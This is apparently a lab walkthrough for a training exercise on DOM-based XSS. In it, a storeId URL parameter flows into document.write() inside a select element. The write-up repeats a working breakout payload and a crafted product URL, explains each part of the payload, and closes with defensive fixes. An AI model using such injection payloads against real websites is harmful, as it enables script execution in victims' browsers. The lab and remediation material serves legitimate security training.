# DOM XSS in `document.write()` Sink Using `location.search` Inside a Select Element

## 1. Vulnerability

**Vulnerability:** DOM-Based Cross-Site Scripting (DOM XSS)

**Difficulty:** Apprentice

**Source:** `location.search`

**Sink:** `document.write()`

**Injection Context:** HTML inside a `<select>` element

**Affected Functionality:** Product stock checker

**Payload:**

```html
"></select><img src=1 onerror=alert(1)>
```

### Description

The application contains a DOM-based XSS vulnerability in its stock checker functionality.

Client-side JavaScript reads the `storeId` parameter from `location.search` and uses `document.write()` to insert the value into the page. The inserted content is intended to represent an option within a `<select>` element.

Because the application inserts attacker-controlled data into HTML without appropriate validation or encoding, an attacker can terminate the existing HTML attribute and close the `<select>` element. The injected `<img>` element then triggers its `onerror` event when the image fails to load, executing `alert(1)`.

This vulnerability demonstrates the risks of writing untrusted URL parameters directly into HTML.

---

## 2. Objective

- Identify `location.search` as the attacker-controlled source.
- Trace the `storeId` parameter through client-side JavaScript.
- Identify `document.write()` as the vulnerable sink.
- Understand the HTML context surrounding the injected value.
- Escape the existing attribute and `<select>` element.
- Inject an HTML element that executes JavaScript.
- Understand appropriate remediation techniques.

---

## 3. Step-by-Step Exploitation

### Step 1 — Open a product page

Open the lab and navigate to a product page.

Locate the **Check stock** or stock checker functionality.

The page contains a drop-down list used to select a store.

### Step 2 — Identify the `storeId` parameter

Inspect the page's URL.

The product URL may look similar to:

```text
/product?productId=1
```

The lab's JavaScript reads a query parameter named:

```text
storeId
```

The relevant browser API is:

```javascript
location.search
```

This property contains the query-string portion of the current URL.

For example:

```text
?productId=1&storeId=London
```

The parameter `storeId` can be controlled by changing the URL.

### Step 3 — Submit a random test value

Add a `storeId` parameter containing a unique alphanumeric string:

```text
?productId=1&storeId=test123
```

Load the modified URL.

The random value helps you determine whether the application uses the parameter when generating the stock checker options.

### Step 4 — Observe the drop-down list

Look at the stock checker drop-down list.

If the value is reflected successfully, you should see `test123` as one of the options.

This confirms that the parameter influences the page's client-side output.

### Step 5 — Inspect the HTML

Right-click the drop-down list and select **Inspect**.

Examine the generated `<select>` and `<option>` elements.

You may observe markup conceptually similar to:

```html
<select>
    <option>London</option>
    <option>Paris</option>
    <option>test123</option>
</select>
```

This is illustrative markup; use the actual DOM observed in your browser for your evidence.

The important finding is that attacker-controlled input has been inserted into an HTML structure.

### Step 6 — Understand the vulnerable JavaScript

The application reads a value from the query string and passes it to `document.write()`.

Conceptually, the code behaves like:

```javascript
const storeId = /* value extracted from location.search */;

document.write('<option>' + storeId + '</option>');
```

The actual implementation may differ, but the vulnerable data flow is:

```text
location.search
       ↓
storeId
       ↓
document.write()
       ↓
HTML parsing
       ↓
Stock checker DOM
```

`document.write()` writes its supplied string as HTML rather than automatically treating it as plain text.

### Step 7 — Construct the XSS payload

Use the following payload:

```html
"></select><img src=1 onerror=alert(1)>
```

The payload contains three important operations:

1. The double quote (`"`) terminates the existing quoted attribute.
2. `></select>` closes the current tag and the `<select>` element.
3. The `<img>` element introduces an event handler that executes JavaScript when image loading fails.

### Step 8 — Insert the payload into the URL

Use the product URL with the `storeId` parameter:

```text
/product?productId=1&storeId="></select><img src=1 onerror=alert(1)>
```

For a browser-safe URL, encode the spaces and other characters as needed. The lab's supplied payload can be represented as:

```text
product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
```

Load the modified URL in the lab browser.

### Step 9 — Verify JavaScript execution

If the payload executes successfully, the browser displays a JavaScript alert containing:

```text
1
```

This confirms that the injected HTML was interpreted by the browser and that the `onerror` handler executed.

---

## 4. Payload Breakdown

The complete payload is:

```html
"></select><img src=1 onerror=alert(1)>
```

### `"`

The double quote terminates the existing quoted attribute.

### `>`

The greater-than sign closes the current HTML tag.

### `</select>`

This closes the surrounding drop-down element, allowing subsequent markup to be interpreted outside that element.

### `<img src=1>`

Creates an image element. The browser attempts to load the resource specified by `src`.

### `onerror=alert(1)`

When image loading fails, the `onerror` handler invokes `alert(1)`.

The browser's execution flow is:

```text
Attacker-controlled storeId
          ↓
document.write()
          ↓
HTML parser processes input
          ↓
Existing attribute is terminated
          ↓
<select> element is closed
          ↓
<img> element is created
          ↓
Image loading fails
          ↓
onerror handler executes
          ↓
alert(1)
```

---

## 5. Why Does This Work?

The vulnerability exists because the application treats untrusted query-string data as HTML.

The source is:

```javascript
location.search
```

The dangerous sink is:

```javascript
document.write()
```

When attacker-controlled data reaches this sink, the browser parses it as markup.

The application does not correctly prevent the input from changing the surrounding HTML structure.

**Key lesson:** Untrusted input should not be inserted directly into HTML using `document.write()`.

---

## 6. Impact

Depending on the application's functionality and the victim's privileges, DOM-based XSS may allow an attacker to:

- Execute JavaScript in the vulnerable application's origin.
- Modify page content.
- Perform actions available to the victim.
- Access information exposed to JavaScript.
- Present phishing content within a trusted interface.
- Target privileged users.

The actual impact depends on the application's architecture, browser protections, authentication model, and other security controls.

---

## 7. Defensive Measures

### 7.1 Avoid `document.write()` for untrusted data

Avoid inserting untrusted URL parameters into HTML strings.

Where possible, create DOM elements using safe APIs and assign user-controlled values as text.

For example:

```javascript
const option = document.createElement('option');
option.textContent = storeId;
selectElement.appendChild(option);
```

This treats `storeId` as text instead of parsing it as HTML.

The application should also validate that `storeId` corresponds to a legitimate store identifier.

### 7.2 Validate the `storeId` parameter

If `storeId` should be a numeric identifier or one of a known set of store IDs, enforce that expected format.

Do not rely on input validation alone to prevent XSS; safe output handling is also necessary.

### 7.3 Use context-appropriate output handling

When data must be inserted into HTML, encode it for the correct context or use APIs that avoid HTML parsing.

HTML text, HTML attributes, JavaScript strings, and URLs require different handling.

### 7.4 Implement Content Security Policy

A strong Content Security Policy (CSP) can provide additional protection against XSS.

CSP is a defense-in-depth measure and should not replace safe DOM manipulation.

---

## 8. Remediation Summary

| Issue | Recommended Defense |
|---|---|
| URL parameter reaches `document.write()` | Avoid writing untrusted data as HTML |
| User input changes HTML structure | Use safe DOM APIs |
| `storeId` accepts unexpected values | Validate against expected identifiers |
| HTML parsing of user input | Use `textContent` where appropriate |
| Additional XSS protection | Implement CSP |

---

## 9. Key Takeaway

This lab demonstrates the **source → sink → HTML parsing → execution** methodology used to investigate DOM XSS.

### Source

```javascript
location.search
```

### Parameter

```text
storeId
```

### Sink

```javascript
document.write()
```

### Payload

```html
"></select><img src=1 onerror=alert(1)>
```

### Execution chain

```text
URL query string
       ↓
location.search
       ↓
storeId
       ↓
document.write()
       ↓
Break out of existing HTML context
       ↓
Inject an image element
       ↓
onerror event
       ↓
alert(1)
```

When investigating DOM XSS, always identify where data originates, how JavaScript processes it, which HTML context receives it, and whether the browser interprets the data as executable markup.

---

## 10. Evidence

**Test value:**

```text
test123
```

**Source:**

```javascript
location.search
```

**Sink:**

```javascript
document.write()
```

**Payload:**

```html
"></select><img src=1 onerror=alert(1)>
```

**Trigger:** Load the crafted product URL.

**Expected result:** A JavaScript alert displaying `1`.

**Verification:** Confirm that the `storeId` value appears in the stock checker output and that the crafted URL causes JavaScript execution.

**Remediation:** Avoid writing untrusted data into HTML and use safe DOM APIs.

**Lab status:** Mark as solved only after confirming the alert in the lab environment.
